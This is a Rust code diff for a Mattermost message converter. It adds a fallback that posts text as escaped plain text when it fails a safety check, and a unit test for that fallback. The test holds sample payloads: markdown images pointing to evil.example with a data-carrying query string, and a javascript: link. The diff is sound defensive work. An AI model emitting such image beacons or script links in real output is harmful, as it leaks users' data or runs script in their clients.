@@ -135,7 +135,26 @@ pub fn render_text(neutral: &str, lk: &Lookups) -> String {
     }
     out.push_str(rest);
     // `defuse` skips the private-use marker, so the core's `<@here>` survives.
-    defuse(&out).replace(HERE, "@here")
+    let out = defuse(&out).replace(HERE, "@here");
+    // Last line of defence (FIX-142 review): nothing after the core's sanitizer may produce what
+    // the sanitizer refuses. If the converted text holds an image, a link outside http/https/
+    // mailto or an image opener, the whole text is posted as escaped plain text instead.
+    if crate::convert::is_safe(&out) {
+        out
+    } else {
+        tracing::warn!(
+            "converted Mattermost text failed the safety re-check; posting it as plain text"
+        );
+        defuse(&aurora_core::sanitize::markdown_as_data(
+            &neutral_without_marker(neutral),
+            usize::MAX,
+        ))
+    }
+}
+
+/// `neutral` with the private marker removed (the fallback never carries a live `@here`).
+fn neutral_without_marker(neutral: &str) -> String {
+    neutral.replace(HERE, "")
 }
 
 fn is_word(c: char) -> bool {
@@ -368,6 +387,28 @@ mod tests {
         l.users.insert("u1".into(), "alice".into());
         l.spaces.insert("c1".into(), "general".into());
         l
+    }
+
+    /// FIX-142 review: text that reaches the connector with an image or a bad link in it (the
+    /// core's sanitizer was bypassed) is posted as escaped plain text, never as the construct.
+    #[test]
+    fn text_the_core_would_have_refused_is_posted_as_plain_text() {
+        for bad in [
+            "![x](https://evil.example/?d=S)",
+            "[x](javascript:alert(1))",
+            "![x](https://evil.example/p.png =10x10)",
+            "$![x](https://evil.example/?d=S)$",
+        ] {
+            let out = render_text(&format!("hello {bad}"), &lk());
+            assert!(crate::convert::is_safe(&out), "{bad} -> {out}");
+            assert!(out.starts_with("hello "), "{out}");
+            assert!(out.contains("\\!") || !out.contains("!["), "{out}");
+        }
+        // Good text is not touched by the check.
+        assert_eq!(
+            render_text("a **b** [c](https://x.example)", &lk()),
+            "a **b** [c](https://x.example)"
+        );
     }
 
     #[test]
